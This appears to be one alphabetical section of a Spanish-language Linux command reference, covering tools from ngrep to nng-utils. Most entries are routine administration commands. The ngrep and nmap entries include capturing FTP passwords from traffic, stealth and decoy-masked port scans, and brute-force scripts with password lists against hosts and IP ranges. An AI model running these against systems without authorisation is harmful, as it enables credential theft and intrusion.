$ nghttpx --frontend="127.0.0.1,8080;no-tls" --backend="0.0.0.0,0;http-proxy" (forward proxy (como Squid pero HTTP/2. Luego configurar el navegador o curl con proxy http://127.0.0.1:8080)


ngrep
Herramienta para monitorear el tráfico de red. Grep para tráfico de red.
# ngrep port 80  (captura todo lo que use el puerto 80)
# ngrep -d eth0 port 80 (especificando una interfaz de red)
# ngrep -d eth0 "Host:" port 80 (Buscar una expresión en el tráfico)
# ngrep -d eth0 -W byline "Host:" port 80 (mostrar la salida por linea)
# ngrep -e -x PASS (introduciendo una cadena en la busqueda y mostrando lo que no coincida con ella)
# ngrep b    (captura todo usando el filtro por defecto)
# ngrep port 80 -O archivo (redirige la salida a un archivo)
# ngrep -l -q -d eth0 -i "^GET |^POST " tcp and port 80 (muestra las cargas útiles de paquetes HTTP coincidentes en la interfaz eth0)
# ngrep -wi -d any 'user|pass' port 21 (realiza un seguimiento de los paquetes que contienen "user" o "pass" en el tráfico FTP)
Nota.- Las almoadillas (#) son paquetes que no cumplen la expresión regular.


nice
(Ver renice). Prioridad de un comando o aplicación. Por defecto 10
# nice -n -10 cdrecord
Nota.- Valores, de mayor (-20) a menor (19). Sólo root puede establecer valores negativos.


nicstat
Imprime estadísticas de red para todas las tarjetas de red.
# nicstat -x (ver salida extendida)
# nicstat 5 4 (Imprimir estadísticas para todas las interfaces cada 5 segundos 4 veces)
# nicstat -t (ver estadísticas TCP)
# nicstat -u (ver estadísticas UDP)
# nicstat -a (muestra las estadísticas x, t i u)
# nicstat -i eth0,eth1 3 (Imprimir estadísticas cada 3 segundos solo para las interfaces eth0 y eth1)


nictools-pci
Herramientas que pueden ayudar a diagnosticar problemas con tarjetas Ethernet o, en algunos casos, darles a esas tarjetas la pista final para que funcionen en la red. El paquete está intregado por los siguientes comandos: alta-diag, eepro100-diag, epic-diag, myson-diag, natsemi-diag ne2k-pci-diag, ns820-diag, pci-config, pcnet-diag, rtl8139-diag, starfire-diag, tulip-diag, via-diag, vortex-diag, winbond-diag y yellowfin-diag.
# pci-config
# rtl8139-diag -a


nield
Daemon para recibir notificaciones del núcleo a través del socket de enlace de red y generar registros relacionados con las interfaces NIC [network information service]. Una vez arrancado el daemon [/etc/init.d/nield start] visualizar los logs en /var/log/nield.log.


nik4
script para exportar imágenes desde Mapnik utilizando las bibliotecas de Python. Mapnik es una herramienta para la representación de mapas.
$ nik4 -c 2.483307 42.185949 --size-px 800 600 -z 17 style.xml imagen.png (centrar un mapa a unas coordenadas con tamaño fijo en píxeles)
$ nik4 --url "https://www.openstreetmap.org/#map=17/42.185949/2.483307" osm.xml imagen.png
Nota.- Archivos como osm.xml, custom.xml, etc. Es el estilo de Mapnik que definirá cómo se renderizan los datos. Sin ese archivo XML, nik4 no sabe cómo representar el mapa.


nikto
[libnet-ssleay-perl libwhisker-perl nmap]. Herramienta de escaneo de servidores web que efectua diferentes comprobaciones tales como, detección de malas configuraciones y vulnerabilidades, detección de ficheros, estructura del servidor, versiones y fechas de actualizaciones de servidores, ataques de fuerza bruta por diccionario, reportes en formatos txt, csv, html, etc.
# nikto -update (Actualizar la aplicación)
# nikto -h host_a_analizar -p 80 (Especificando puerto)
# nikto -h 127.0.0.1:80 (Otro modo de especificar host y puerto)
# nikto -h localhost -p 443 -ssl (Especificando puerto y protocolo)
# nikto	-h localhost -p	443,80 -Format html -output resultado (para dos puertos, salida en formato html y con nombre de archivo)
# nikto -h archivo (a partir de un archivo con una ip o host por linea)


nilfs-tools
Conjunto de herramientas para implementación de un sistema de archivos con estructura de registro. Permite la creación continua de instantáneas [Snapshots], de modo que los usuarios pueden restaurar archivos sobrescritos o destruidos por error, incluso si esto ocurre después de la última copia de seguridad. Incluye los ejecutables chcp, dumpseg, lscp, lssu, mkcp, rmcp, mkfs.nilfs2, mount.nilfs2, nilfs-clean, nilfs-resize, nilfs-tune, nilfs_cleanerd y umount.nilfs2.
# mkfs -t nilfs2 /dev/sdb1 (crea un sistema de archivos NILFS2 en un dispositivo)
# mkfs.nilfs2 /dev/sdb1 (Lo mismo)
# mount -t nilfs2 /dev/sdb1 /mnt/nilfs_data (monta un volumen NILFS2)
# umount /mnt/nilfs_data (desmonta un volumen NILFS2)
# nilfs-clean /dev/sdb1 (fuerza la limpieza si el limpiador automático está desactivado)
# nilfs_cleanerd /dev/sdb1 (demonio limpiador de NILFS2. Normalmente se inicia automáticamente al montar o mediante un script de inicio
# nilfs-resize /dev/sdb1 50G (cambia el tamaño de un volumen NILFS2 para expandirlo)
# nilfs-tune -c 60 /dev/sdb1 (ajusta parámetros del sistema de archivos NILFS2, como el intervalo entre checkpoints)
# lscp -l /dev/sdb1 (lista los checkpoints y snapshots [puntos de sincronización] disponibles en el sistema de archivos)
# mkcp -s /dev/sdb1 (crea un nuevo checkpoint explícito o convierte un checkpoint existente en un snapshot de solo lectura)
# chcp -s 1234 /dev/sdb1 (Marca el checkpoint 1234 como snapshot)
# rmcp 1234 /dev/sdb1 (elimina un checkpoint o un snapshot conservado, permitiendo que el limpiador recupere su espacio)
# dumpseg -h /dev/sdb1 (muestra información detallada sobre los segmentos [segmentos son las unidades de escritura de NILFS2] en el dispositivo)
# lssu /dev/sdb1 (lista los estados de uso de segmentos y el uso general del disco)
1.-
Ejemplo Práctico de Recuperación de Archivos
Un volumen NILFS2 montado en /mnt/nilfs_data
# echo "Datos iniciales" > /mnt/nilfs_data/documento.txt (crear un archivo)
# lscp /dev/sdb1 (verificar el último checkpoint. El ID más alto es el último checkpoint)
Accidentalmente, se borra el archivo:
# rm /mnt/nilfs_data/documento.txt
Recuperar la versión anterior montando el checkpoint anterior como una instantánea de solo lectura. Suponiendo que el checkpoint anterior es el 1234:
# umount /mnt/nilfs_data (desmontar el sistema de archivos)
# mount.nilfs2 -r -o cp=1234 /dev/sdb1 /mnt/nilfs_data (volver a montar, pero especificando el checkpoint a usar. "-r" solo lectura y "-o cp=1234" montar el checkpoint 1234)
Ahora /mnt/nilfs_data/documento.txt contiene los "Datos iniciales" de nuevo.
Volver a montar el sistema de archivos en su estado actual, el más reciente:
# umount /mnt/nilfs_data
# mount -t nilfs2 /dev/sdb1 /mnt/nilfs_data
Nota.- Punto de Control (Checkpoint) es una instantánea que se crea automáticamente cada vez que se escriben datos en el disco. Punto de Sincronización (Snapshot) es un checkpoint especial que se marca explícitamente como conservado (no será eliminado por el limpiador) y se comporta como una instantánea de solo lectura.


ninja-build
Sistema de compilación parecida a Make. Su objetivo distintivo es la rapidez. Nace del proyecto del navegador Chromium, que cuenta con más de 30 000 archivos fuente y cuyos otros sistemas de compilación pueden tardar diez segundos en empezar a compilar tras modificar un archivo. Ninja tarda menos de un segundo.
$ ninja (construir un proyecto)
$ ninja nombre_del_objetivo (construir un objetivo específico)
$ ninja -t clean -r rules (elimina todos los archivos creados)
$ ninja -j4 (construir en paralelo, usando 4 jobs)


nis
[Network Information Service - Servicio de Información de Red]. Este paquete proporciona herramientas para configurar y mantener un dominio NIS que se utiliza principalmente para que varias máquinas en una red compartan la misma información de cuenta, usuarios, contraseñas, grupos, hosts, etc. En realidad, NIS permite que un servidor central [master o slave] comparta archivos como /etc/passwd, /etc/group, /etc/hosts, etc., con todos los clientes de la red así, cuando se crea un usuario en el servidor NIS, ese usuario puede hacer login en cualquier cliente sin volver a crearlo localmente. NIS es inseguro ya que envía contraseñas en texto plano por la red y está prácticamente obsoleto. Instalar los paquetes yp-tools, libnss-nis, ypserv y ypbind-mt.
# systemctl enable --now rpcbind ypserv yppasswdd ypxfrd ypbind (arrancar los servicios)
$ echo "midominio-nis" > /etc/defaultdomain (elegir un domainname y configurarlo de forma permanente. Es un nombre arbitrario que agrupa todas las máquinas que usaran el mismo servidor NIS)
$ echo "domain midominio-nis server 192.168.1.10" | sudo tee /etc/yp.conf (indicar el servidor)
$ domainname midominio-nis (elegir un domainname de forma no permanente)
Nota.- nisdomainname y ypdomainname son alias del mismo comando domainname que si no está definido, ypbind y todos los comandos relacionados abortan con "domainname not set - aborting".
$ ypwhich (a qué servidor NIS está conectado el cliente o el propio servidor)
$ ypcat passwd.byname (muestra todo el mapa passwd [usuarios NIS])
$ ypcat group (muestra el mapa de grupos)
$ ypmatch pepe passwd (busca un usuario concreto)
$ yppasswd (cambia la contraseña de un usuario NIS desde cualquier cliente)
$ yppush (lanzado en el servidor fuerza la propagación de mapas a slaves)
$ make -C /var/yp (en el servidor master regenera todos los mapas NIS a partir de /etc/passwd, etc. Se ejecuta automáticamente cuando se cambia usuarios)
$ /usr/lib/yp/ypinit -m (inicializa un servidor master)
$ /usr/lib/yp/ypinit -s master (inicializa un servidor slave)


nitrogen
Gestión de fondos de pantalla para escritorios ligeros.
$ nitrogen /home/usuario/imagenes/linux.png (Poner una imagen)
$ nitrogen --restore (Restablecer la imagen despues de un reinicio. Normalmente se coloca en las opciones de inicio, por ejemplo en openbox, se colocaría en .config/openbox/autostart con la sintaxis: nitrogen --restore &)


nix-bin
Potente gestor de paquetes para Linux y otros sistemas Unix que permite una gestión de paquetes fiable y reproducible. Nix ofrece actualizaciones y reversiones atómicas, instalación simultánea de múltiples versiones de un paquete, gestión de paquetes multiusuario y una sencilla configuración de entornos de compilación. Incluye las aplicaciones nix, nix-build, nix-channel, nix-collect-garbage, nix-copy-closure, nix-daemon, nix-env, nix-hash, nix-instantiate, nix-prefetch-url, nix-shell y nix-store.
# nix upgrade-nix (actualizar la versión de nix)
# nix-build default.nix (Construye el paquete)
# nix-channel --list (listar todos los canales)
# nix-channel --update (actualizar canales)
# nix-collect-garbage (eliminar paquetes no utilizados)
# nix-collect-garbage -d (limpia versiones antiguas y objetos no referenciados)
# nix-copy-closure --to root@remote-host /nix/store/abc123 (copia un conjunto de paquetes y sus dependencias a otro sistema)
# nix run nixpkgs#firefox (instalar y ejecutar un paquete temporalmente)
# nix-env -q (listar paquetes instalados por nix-env)
# nix-env -qa (ver con más detalles)
# nix-env -iA nixpkgs.firefox (instalar un paquete)
# nix-env -u (actualizar todos los paquetes)
# nix-env -u firefox (actualizar un paquete específico)
# nix-env -e firefox (eliminar un paquete)
# nix-env -e vim tmux (eliminar varios)
# nix-env --list-generations (ver generaciones [versiones] de tu perfil)
# nix-env --rollback (volver a una generación anterior)
# nix-env --switch-generation 42 (ir a una generación específica)
# nix-hash --type sha256 --base32 archivo.tar.gz (calcula hashes para archivos o derivaciones, útil para verificar integridad)
# nix-instantiate default.nix (evalúa un archivo .nix y muestra la derivación resultante)
# nix-prefetch-url https://example.com/package.tar.gz (descarga una URL y calcula su hash)
# nix-shell -p python3 numpy (inicia un entorno de desarrollo temporal con los paquetes especificados, sin instalarlos globalmente)
# nix-store --gc --print-dead (listar contenido)
# nix-store --optimise (optimizar el almacén eliminando duplicados)
# nix-shell -p python3 nodejs (usar shell temporal par robar un programa sin instalarlo. Al salir [exit], desaparecen del sistema)
Nota.- Después de instalar nix-bin, se necesita configurar el entorno:
$ nano .bashrc
Y añadir las lineas
  	 if [ -e ~/.nix-profile/etc/profile.d/nix.sh ]; then
	   . ~/.nix-profile/etc/profile.d/nix.sh
	 fi


njs
Subconjunto de JavaScript diseñado específicamente para extender la funcionalidad de NGINX. Permite ejecutar código JavaScript directamente dentro de la configuración de NGINX.  Este comando sirve para depurar scripts, probar lógica de negocio sin necesidad de reiniciar NGINX y validar sintax pero es independiente de Nginx y no se ejecuta dentro de él; por lo tanto, los objetos HTTP y Stream no están disponibles.
$ njs script.js (ejecutar script)
$ njs (modo interactivo)
$ njs -t script.js (con opciones de debugging)


nl
Muestra en pantalla un archivo de texto con las lineas numeradas. No modifica el archivo.
$ nl fichero.txt
$ nl fichero.txt > fichero_numerado.txt


nload
Monitor de tráfico de red
# nload


nm
Lista las funciones de una biblioteca o programa compilado
$nm fichero.o


nmap
Rastrear puertos.
Estados de los puertos:
	abierto (Una aplicación acepta conexiones TCP o paquetes UDP en este puerto indicando qué servicio está corriendo)
	cerrado (Recibe y responde a las sondas de Nmap, pero no tiene una aplicación escuchando en él)
	filtrado (No puede determinar si el puerto está abierto porque un filtrado de paquetes previene que sus sondas lo alcancen)
	no filtrado (Indica que el puerto es accesible pero que Nmap no puede determinar si se encuentra abierto o cerrado)
	abierto|filtrado (Nmap marca a los puertos en este estado cuando no puede determinar si el puerto se encuentra abierto o filtrado)
Entrada de los objetivos cuando no se realiza por la linea de ordenes:
	-iL ips.txt (Desde una lista de ips colocadas una por linea en el archivo ips.txt)
	-iR 100 (Scanear 100 ips aleatoria. Con -iR 0 el escaneo no termina nunca.)
Técnicas de sondeos de puertos que soporta Nmap:
-sA [sondeo TCP ACK] (Este sondeo no puede determinar puertos abiertos o abiertos|filtrados. Se utiliza para mapear reglas de cortafuegos, y para determinar si son cortafuegos con inspección de estados y qué puertos están filtrados.
-sL [Sondeo de lista] (lista los objetivos a analizar sin enviar paquetes de ningún tipo a los objetivos)
-sM [sondeo TCP Maimon] (El sondeo Maimon debe su nombre a la persona que lo descubrió: Uriel Maimon. Describió la técnica en la revista Phrack número 49 (noviembre de 1996). Nmap, que incluye esta técnica, se publicó dos números más tarde. Esta técnica es exactamente la misma a los sondeos Null, FIN, y Xmas, pero en los que se envía una sonda FIN/ACK. Según el RFC 793 (TCP), se debería generar un paquete RST cuando se responde a dicha sonda independientemente de si el puerto está cerrado o abierto. Uriel se dio cuenta, sin embargo, de que muchos sistemas derivados de BSD simplemente descartan el paquete si el puerto está abierto.
-sN, -sF, -sX [sondeos TCP Null, FIN, y Xmas] (Estos sondeos aprovechan una indefinición en la RFC de TCP que diferencia los puertos abiertos y cerrados. La ventaja fundamental de este tipo de sondeos es que pueden atravesar algunos cortafuegos que no hagan inspección de estados o encaminadores que hagan filtrado de paquetes. Otra ventaja es que este tipo de sondeos son algo más sigilosos que, incluso, un sondeo SYN. Un problema de estos sondeos es que no se puede distinguir los puertos abiertos de algunos puertos filtrados, lo que resulta en la respuesta abierto|filtrado.
-sO [sondeo de protocolo IP] (Este sondeo permite determinar qué protocolos [TCP, ICMP, IGMP, etc.] soportan los sistemas objetivo. Esto no es, técnicamente, un sondeo de puertos, dado que cambia los números de protocolo IP en lugar de los números de puerto TCP ó UDP.
-sP [sondeo ping] (Sólo determina si el objetivo responde. Metodo intrusivo)
-sS [sondeo TCP SYN] (Es el utilizado por defecto. Puede sondear miles de puertos por segundo en una red rápida sin cortafuegos y es relativamente sigiloso y poco molesto, ya que no llega a completar las conexiones TCP)
-sT [sondeo TCP connect()] (Es el sondeo por omisión cuando no se puede utilizar el sondeo SYN. Al realizar conexiones completas para abrir los puertos objetivo en lugar de realizar el reseteo de la conexión medio abierta como hace el sondeo SYN implica que tarda más tiempo y son necesarios más paquetes para obtener la información y que muy probablemente el sistema objetivo va a registrar la conexión.)
-sU [sondeos UDP] (Los 3 servicios UDP más comunes son: DNS [53], SNMP [161/162], y DHCP [67/68].  Los sondeos UDP funcionan mediante el envío (sin datos) de una cabecera UDP para cada puerto objetivo. Si se obtiene un error ICMP indica que el puerto no es alcanzable y se marca como cerrado. Si se recibe cualquier error ICMP no alcanzable se marca el puerto como filtrado. Si se recibe una respuesta al paquete UDP el puerto está abierto. Si no se ha recibido ninguna respuesta después de algunas retransmisiones entonces se clasifica el puerto como abierto|filtrado. Esto significa que el puerto podría estar abierto o que hay un filtro de paquetes bloqueando la comunicación. Puede utilizarse el sondeo de versión (-sV) para diferenciar los puertos abiertos de los filtrados.
-sV [Sondear versiones] (Sondea puertos abiertos para obtener información de la versión del servicio.
-sW [sondeo de ventana TCP] (Aprovecha de un detalle de implementación de algunos sistemas que permite diferenciar puertos abiertos de los cerrados, en lugar de imprimir no filtrado cuando se devuelve un RST.)
--scanflags [Sondeo TCP a medida] (Esta opción permite diseñar su propio sondeo mediante la especificación de banderas TCP arbitrarias y puede ser un valor numérico como el 9 (PSH y FIN), aunque es más sencillo utilizar nombres simbólicos juntando la combinación de URG, ACK, PSH, RST, SYN, y FIN [--scanflags URGACKPSHRSTSYNFIN] donde se fijan todas las banderas, aunque no es muy útil para sondear. Este es un método de sondeo avanzado que permite hacer un sondeo de puertos TCP a ciegas de verdad lo que significa que no se envía ningún paquete al sistema objetivo desde su dirección IP real por lo que es extraordinariamente sigiloso)
Descubrimiento de sistemas:
-P0 [No realizar ping] (Nmap no realiza la etapa de descubrimiento y actua como si cada Ip objetivo se encontrara activa)
-PA22,445 [Ping TCP ACK] (Envía un paquete TCP vacío con la bandera ACK a una lista de puertos separados por comas para determinar si responden.
-PS21,22,25,80 [Ping TCP SYN] (Envía un paquete TCP vacío con la bandera SYN a una lista de puertos separados por comas para saber si el sistema responde.
-PU445,5000 [Ping UDP] (Envía paquetes UDP vacios a los puertos indicados para indicar si el sistema responde. Atraviesan cortafuegos y filtros que sólo analizan TCP)
-PR [Ping ARP] (El sondeo ARP detecta máquinas en la red local)
Especificación de puertos:
	-p 21,22 (Separados por comas)
	-p- (Todos los puertos de 0 al 65535)
	-p 1-1023 (Del 1 al 1023)
	-F (escanear los 100 puertos más usados)
	-r (Analizar los puertos de forma secuencial. Por defecto se analizan de forma aleatoria)
Formatos de salida:
	-oN archivo (Redirigir la salida a un archivo especificado)
	-oX archivo.xml (Redirigir a un archivo xml
	-oS archivo (Redirigiendo a una salida humoristica sobre los script kiddies)
Otras opciones:
	-A (Opciones de sondeos agresivos. Activa detección de sistema operativo [-O] y el análisis de versiones [-sV]).
	-n (No realizar resolución DNS de las direcciones IP activas que encuentre)
	-R (Realizar resolución DNS de todos los objetivos)
	-O (Averiguar el sistema operativo)
	-O --osscan-guess (Averiguar el sistema operativo fonzandolo a identificarse)
	-D 192.168.1.12,192.168.1.13,192.168.1.14 IP_OBJETIVO (Especificando ips falsas separadas por comas para emmascarar la nuestra)
	-T4 (Tiempo de sondeo desde muy lento y fiable [0] a muy rápido e impreciso [5])
	-S IP (Especificando una IP falsa)
	-v (Incrementar el nivel de detalle. -vv mayor incremento de detalle)
nmap scripts
funcionalidad de nmap que permite la realización de diversas tareas de descubrimiento, detección, expotación de diversas vulnerabilidades, etc. Listado en http://nmap.org/nsedoc/index.html y en local: /usr/share/nmap/scripts/:
Categorias:
auth (Identifican credenciales de autenticación en el sistema objetivo frecuentemente por fuerza bruta [ftp-anon, snmp-brute, http-auth...])
broadcast (Realizan un escaneo broadcast en toda la red objetivo sin necesidad de indicar los host de forma manual. utilizando el argumento “newtargets” se indica a Nmap incluir los host descubiertos en la pila de escaneo.)
default (Conjunto de scripts que tratan de capturar la mayor cantidad de información de un objetivo a costa de generar mucho ruido en el sistema remoto.)
discovery (Tratan de mapear los host de la red [registros públicos, dispositivos SNMP, servicios de directorio...])
dos (Intentan causar denegación de servicio sobre un servicio determinado.)
exploit (Tratan de detectar y explotar algún tipo de vulnerabilidad sobre el objetivo.)
external (Los que se comunican con otros hosts distintos del local. Pueden enviar a una fuente externa la IP del objetivo y del atacante.)
fuzzer (Envían datos aleatorios, inesperados o incompletos, con el fin de detectar posibles vulnerabilidades en servicios)
intrusive (Intentan utilizar grandes recursos del sistema objetivo que pueden incluso inutilizarlo)
malware (Intentan determinar si el objetivo se encuentra infectado con maleware o backdoors [smtp-strangeport y auth-spoof])
safe (Scripts poco intrusivos diseñados para no afectar ni dañar el objetivo [ssh-hostkey o html-title])
version (Diseñados para identificar versiones concretas de servicios. Se ejecutan solo si el escaneo tiene la opción Scan Version [-sV])
vuln (Dedicados a la detección de vulnerabilidades pero no su explotación [realvnc-auth-bypass y afp-path-vuln])
Opciones:
# nmap --script-args <argumentos> (Se trata de un conjunto de argumentos que se suministran a los Scripts que admiten parámetros para configurar su ejecución.)
# nmap --script citrix-brute-xml --script-args=userdbd=usernames.lst,passdb=passwords.lst,ntdomain=domain -p 80,443,8080 IP
# nmap --script auth --script-args userdb=usernames.lst,passdb=passwords.lst IP
usernames.lst (base de datos de usuarios. Personalización en /usr/share/nmap/nselib/data/usernames.lst)
passdb (base de datos de contraseñas. Personalización en /usr/share/nmap/nselib/data/passwords.lst)
ntdomain (dominio nt del servidor- previamente ha de averiguarse)
Nota.- En algunos scripts las bases de datos usuarios/paswwords .lst se usan por defecto.
Mostrar información
	--script-help vuln (De una categoria)
	--script-help openlookup-info.nse (De un script)
	--script-help all (De todo)
	--script-trace (toda la comunicación entrante y saliente ejecutada por los scripts es impresa en pantalla)
Actualizaciones:
	--script-db (Actualiza la base de datos localizada en scripts/script.db. Útil si se ha añadido o suprimido alguno
	--script-updatedb (Actualiza los scripts de la base de datos)
Ejemplos:
# nmap -iR 10000 -p 80 (Selecciona objetivos al azar por el puerto 80)
# nmap -sP IP  (Sondeo Ping. Para detectar equipos de una red)
# nmap -P0 IP  (Asume que todos los objetivos están vivos)
# nmap -PS -p 137-139 IP  (Análisis TCP de los puertos indicados)
# nmap -PE IP  (Análisis ICMP del tipo echo)
# nmap -PI IP     (Utiliza paquetes icmp para determinar que hosts están conectados y es especial si deseas hacer un scan a través de un firewall)
# nmap -sF IP     (Analisis sigiloso)
# nmap -sW IP    (especial para máquinas windous)
# nmap -sX IP     (Análisis Xmas)
# nmap -sS -A -p 1-65535 IP  (escanear todos los puertos [-p...] TCP [-sS] y detectar las versiones del software [-A] de forma silenciosa)
# nmap --version-all IP  (Utilizar todas las sondas con intensidad 9 -máxima)
# nmap -p 1-65535 --open localhost  (lista de puertos abiertos)
# nmap -p 80 hostname  (determina si el puerto 80 está abierto)
# nmap -sn 192.168.1.0/24 (descubrir máquinas conectadas de una red)
# nmap -v -sP 192.168.1.0/24 | grep down | wc -l (Ips disponibles en una red)
# nmap -p- localhost (rastrear todos los puertos)
# nmap --iflist (Muestra la lista de interfaces de red y rutas)
# nmap 192.168.0.* --exclude 192.168.0.100 (Excluir un host del escaneo de una red)
# nmap --iflist (encontrar la interfaz y la información del propio host)
Con scripts
# nmap --script="http-* and not http-enum" IP (filtro AND y NOT. Para usar todos los scripts http pero no los de enumeración)
# nmap --script malware IP (Usará todos los scripts de la categoria "malware")
# nmap -sC IP (Usar todos los de la categoria "default" [-sC])
# nmap -PN -p81 --script http-iis-webdav-vuln IP (Buscando vulnerabilidades Webdav)
# nmap --script-trace --script smb-check-vulns -p445 IP (Detectar Conficker, gusano informático que apareció en octubre de 2008, que ataca sistemas Windows)
# nmap -sU -script=citrix-enum-servers -p1604 IP (explorar si hay algún servidor o granja citrix y realizar una enumeración de las aplicaciones publicadas)
# nmap -P0 -n -sS -p445,139 --script=smb-security-mode IP
# nmap --script vnc-brute 127.0.0.1
# nmap -p 22 --script ssh-hostkey host  (especificando puerto)
# nmap -p 5900 --script vnc-brute --script-args passdb=/home/USER/wordlist host (usando un dicccionario)
# nmap --script mysql-brute 192.168.1.1-255 (escaneo de rangos)
# nmap --script vnc-brute localhost (contra un host con vnc a la escucha)
# nmap -sV --script=ftp-brute IP
# nmap --script ftp-brute --script-args userdb=/tmp/users IP
# nmap --script ftp-brute --script-args userdb=/tmp/users,passdb=/tmp/passwds IP
# nmap --script ssh-hostkey --script-args ssh_hostkey=full host
# nmap --script ssh-hostkey --script-args ssh_hostkey=all host
# nmap -sV -sC --script-args ftp-anon.maxlist=-1 IP (Comprueba si un servidor ftp permite conexiones anónimas. El "-1" para desactivar el límite de 20 archivos)
1.-
Fortificando nmap con los scripts vulcan
modulo que permite volver a NMAP en un escaneador de vulnerabilidades haciendo uso de un base de datos en formato .csv. Dichos csv son los siguientes: scipvuldb.csv (http://www.scip.ch/en/?vuldb), cve.csv (http://cve.mitre.org), osvdb.csv (http://www.osvdb.org), securityfocus.csv (http://www.securityfocus.com/bid/), securitytracker.csv (http://www.securitytracker.com), xforce.csv (http://xforce.iss.net), exploitdb.csv (http://www.exploit-db.com) y openvas.csv (http://www.openvas.org). Descargar vulcan de http://www.computec.ch/projekte/vulscan/ y descomprimir el tar.gz. En la carpta vulcan tendremos las bases de datos en formato cvs y un script nse. El nse lo colocamos con el resto de scripts de nmap en /usr/share/nmap/scripts/ y el resto de la carpeta vulcan la mevemos al mismo directorio d scripts:
# mv vulcan/vulscan.nse /usr/share/nmap/scripts/
# mv vulcan /usr/share/nmap/scripts/
Algunas formas de uso:
# nmap -sV --script=vulscan HOST (Comprobará todas las listas de vulnerabilidades))
# nmap -sV --script-args vulscandb=exploitdb HOST -p 80 (Usando una base de datos concreta contra un puerto)
Nota.- las bases de datos están completamente desactualizadas.


nmblookup
[samba]. Resolución de nombres netbios
$ nmblookup -A 192.168.1.125


nmcli
Herramienta de línea de comandos para controlar NetworkManager y para conocer su estado.
$ nmcli device wifi list (listar wifis cercanas)
$ nmcli -m tabular device show (ver todos los dispositivos de red de forma tabulada. Otra opción es multiline)
$ nmcli connection show (ver conexion activa)
$ nmcli connection (lo mismo)
$ nmcli general status (estado)
$ nmcli device wifi connect SSID_or_BSSID password password (conectarse a una wifi)
$ nmcli device wifi connect SSID_or_BSSID password password hidden yes (conectarse a una wifi oculta)
$ nmcli connection up name_or_uuid (conectarse a una red)
$ nmcli -p -f general,wifi-properties device show wlan0 (ver información extensa [p] y propiedades de los campos expecificados [f])
$ nmcli general permissions (permisos)
$ nmcli device (listado de dispositivos de red y su estado)
$ nmcli device disconnect ifname eth0 (desconectarse de una interfaz)
$ nmcli connection delete name_or_uuid (eliminar una conexion)
$ nmcli radio wifi off (desactivar una wifi)
$ nmcli general reload (reiniciar servicio despues de modificar una conexión)


nmon
Monitor del sistema
# nmon   (arranca la aplicación y muestra las teclas de control para escoger lo que se monitorea. “q” para cerrar la aplicación)


nmrpflash
Utilidad de actualización de firmware para dispositivos Netgear [EX2700, DNG3700v2, R6220, R7000, D7000, WNR3500, R6400 y R6800]


nmzmail
Herramienta que sirve de “puente” entre el lector de correos, normalmente Mutt y el motor de búsqueda Namazu2. Su única misión es indexar todos los mensajes que haya en una o varias carpetas Maildir y aceptar una consulta desde Mutt, pasarla a Namazu2 y devolver la lista de mensajes que coincidan para que Mutt pueda mostrar sólo esos correos.
$ nmzmail -v -f ~/.nmzmail-index -m ~/Maildir (indexar en modo verbose, donde se guardará el índice y carpeta de los mensajes)
$ nmzmail -v -f ~/.nmzmail-index -m ~/Maildir -u (reindexar sólo lo nuevo)
$ nmzmail -v -f ~/.nmzmail-index -m ~/Maildir -m ~/Maildir-trabajo -m ~/Maildir-lists (indexar varias carpetas a la vez)
$ nmzmail -f ~/.nmzmail-index -s "presupuesto final" (probar una busqueda)


nn
Lector de noticias USENET clásico [años 80–90], muy rápido y antiguo, pensado para servidores UNIX conectados a un news server [NNTP]. No está pensado para leer RSS, blogs ni webs: funciona solo con servidores USENET, por ejemplo news.eternal-september.org [registro gratis]. Incluye las herramientas nnadmin, nnbatch, nncheck, nngoback, nngrab, nngrep, nnpost, nnstats, nntidy, nnusage y nnview.
Para evitar que al lanzar alguno de los comandos nos diga:
     hostname=debian, You need a fully qualified domain name
"hostname=debian" o el que sea, es porque nn espera un nombre tipo debian.localdomain, debian.lan, debian.home... para solucionarlo:
# nano /etc/hosts
Y modificar la linea para que quede:
     127.0.1.1   debian.localdomain   debian
Para configurar el servidor de noticias, nn necesita un servidor NNTP, que ha de ponerse en la variable de entorno:
$ export NNTPSERVER=news.eternal-september.org
O en el archivo
# nano /etc/news/server
Con una sola línea:
      news.eternal-september.org
La lista de grupos suscritos en ~/.newsrc y los articulos descargados en ~/.nn o en /var/spool/news.


nncp
[Node to Node CoPy]. Paquete que facilita el intercambio seguro [cifrados de extremo a extremo y firmados] de archivos y correo mediante almacenamiento, por defecto en /var/spool/nncp y reenvío. Es muy usado en redes aire-gap [air-gapped], redes de malla, redes lentas o cuando se quiere comunicación cifrada sin depender de servidores centrales.
$ nncp-file backup.tar.gz servidor:documentos/2025/ (enviar el archivo backup.tar.gz al servidor. El archivo queda cifrado en /var/spool/nncp/out/ y esperará a que se haga el transporte))
$ tar czf - /home/usuario/archivo | nncp-pipe servidor:backups/vivo-$(date +%F).tar.gz (enviar por tubería)
$ echo "Hola desde casa" | nncp-mail -to usuario@servidor dominio.com (enviar correo electrónico. Funciona con msmtp, notmuch, aerc, etc)
$ nncp-bundle -tx > /media/usb/nncp-para-servidor (crear paquetes para llevar en un USB...)
$ nncp-bundle -rx < /media/usb/nncp-para-servidor (...y en el servidor, insertar el USB)
$ nncp-check (verifica integridad)
$ nncp-toss (desencripta y ejecuta)
$ nncp-daemon -bind 0.0.0.0:5400 (En servidor, escuchar en puerto 5400 o hidden service Tor)
$ nncp-daemon -bind "onion:puertotorhidden:5400" (... o con Tor)
$ nncp-call servidor (llamar cuando haya internet...)
$ nncp-call -onion servidor (... o con Tor)
$ nncp-stat (muestra paquetes pendientes)
$ nncp-pkt paquete(inspecciona un paquete concreto)
$ nncp-check (verifica integridad de todos)
$ nncp-trns -node intermediario -via casa archivo.txt destino:/ (reenviar paquetes a través de un nodo intermedio [trampoline])


nng-utils
[Nanomsg Next Generation]. Biblioteca de mensajería ligera diseñada para resolver problemas comunes de comunicación entre procesos o nodos, como publicación/suscripción [pub/sub], solicitud/respuesta [req/rep], pipelines [Push/Pull], par a par [Pair], encuesta/respuesta [Survey], bus de mensajes [Bus] y descubrimiento de servicios.
$ nngcat --pub --url tcp://127.0.0.1:5555 (El publicador. Escribe mensajes en la terminal y nngcat los enviará a todos los suscriptores conectados al puerto 5555)
$ nngcat --sub --url tcp://127.0.0.1:5555 --sub topic: (Suscriptor. Recibirá todos los mensajes publicados en el topic especificado o todos si no se especifica)
$ nngcat --rep --url tcp://127.0.0.1:5556 (Servidor. Espera solicitudes y responde a cada mensaje recibido)
$ nngcat --req --url tcp://127.0.0.1:5556 (Cliente. Envía mensajes y espera una respuesta por cada uno)
$ nngcat --push --url tcp://127.0.0.1:5557 (envía mensajes a un receptor "pull")
$ nngcat --pull --url tcp://127.0.0.1:5557 (recibe mensajes enviados por un emisor "push")
